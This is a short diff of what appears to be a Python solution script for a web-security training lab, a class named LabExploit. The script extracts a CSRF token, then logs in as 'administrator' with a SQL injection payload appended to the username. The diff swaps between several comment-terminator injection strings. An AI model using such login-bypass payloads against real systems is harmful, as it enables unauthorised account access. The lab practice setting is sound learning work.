@@ -73,7 +73,9 @@ class LabExploit:
         print(f"[+] Extracted CSRF Token: {csrf_token}")
 
         # Step 2: Perform Injection in username
-        sqli_payload = "' OR 1=1 --"
+        # sqli_payload = "'-- "
+        # sqli_payload = "' OR 1=1 -- "
+        sqli_payload = "' AND 1=1 -- "
         login_data = {
             "csrf": csrf_token,
             "username": f"administrator{sqli_payload}",
